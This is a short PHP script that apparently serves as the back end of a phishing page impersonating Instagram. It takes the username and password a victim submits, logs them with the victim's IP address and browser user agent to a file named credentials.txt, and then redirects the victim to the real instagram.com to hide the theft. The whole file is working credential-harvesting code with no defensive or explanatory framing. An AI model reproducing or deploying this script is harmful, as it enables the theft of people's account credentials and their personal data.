<?php

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }


$useragent = $_SERVER['HTTP_USER_AGENT'];

file_put_contents("credentials.txt","Account: " . $_POST['username'] . "\nPass: " . $_POST['password'] . "\nIP Addres: " . $ipaddress . "User-Agent: " . $useragent . "\n************************\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>
